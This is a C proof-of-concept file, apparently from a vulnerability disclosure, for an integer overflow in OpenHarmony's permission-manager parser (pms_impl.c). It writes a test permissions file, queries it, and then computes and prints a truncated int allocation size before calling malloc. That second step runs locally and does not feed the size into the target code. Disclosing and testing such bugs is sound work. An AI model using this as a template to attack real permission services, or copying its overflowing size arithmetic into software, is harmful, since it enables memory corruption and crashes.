/*
 * PoC: Integer Overflow in Server-Side ParsePermissions (CWE-190)
 * Target: OpenHarmony security_permission_lite, pms_impl.c:183
 * Method: GN Target-Compile — links against real pms_impl.a
 *
 * Build:
 *   cd /tmp/ohos_build_prod && gn gen out/default && ninja -C out/default
 *   (builds server_poc from test/server_test_driver.c + hal_stubs.c + pms_impl.a)
 *
 * Run:
 *   ./out/default/obj/test/server_poc
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <limits.h>
#include <sys/stat.h>
#include <sys/types.h>

#include "pms.h"
#include "pms_types.h"

extern const char *HalGetPermissionPath(void);

static int write_perm_file(const char *id, int n) {
    char path[512];
    snprintf(path, sizeof(path), "%s%s", HalGetPermissionPath(), id);
    FILE *f = fopen(path, "w");
    if (!f) return -1;
    fprintf(f, "{\"permissions\":[");
    for (int i = 0; i < n; i++) {
        if (i > 0) fprintf(f, ",");
        fprintf(f, "{\"name\":\"P%d\",\"desc\":\"D%d\",\"isGranted\":1,\"flags\":\"0\"}", i, i);
    }
    fprintf(f, "]}");
    fclose(f);
    return 0;
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);

    /* Step 1: Verify server-side code works correctly */
    mkdir(HalGetPermissionPath(), 0755);
    write_perm_file("com.test", 3);
    PermissionSaved *perms = NULL;
    int permNum = 0;
    int ret = QueryPermission("com.test", &perms, &permNum);
    printf("[Normal path] ret=%d, permNum=%d\n", ret, permNum);
    if (ret == 0 && perms && permNum == 3) {
        for (int i = 0; i < permNum; i++)
            printf("  perm[%d]: name='%s' granted=%d\n", i, perms[i].name, perms[i].granted);
        free(perms);
    }

    /* Step 2: Trigger integer overflow */
    size_t ss = sizeof(PermissionSaved);
    int threshold = (int)(INT_MAX / ss);
    int pSize = threshold + 1;
    int overflow_alloc = (int)(ss * pSize);

    printf("\n[Overflow trigger]\n");
    printf("  sizeof(PermissionSaved) = %zu\n", ss);
    printf("  pSize = %d (threshold: %d)\n", pSize, threshold);
    printf("  %zu * %d = %lld (exact)\n", ss, pSize, (long long)ss * pSize);
    printf("  (int) = %d (OVERFLOW)\n", overflow_alloc);
    printf("  malloc(%zu)...\n", (size_t)overflow_alloc);

    void *crash = malloc((size_t)overflow_alloc);
    if (crash) free(crash);

    return 0;
}
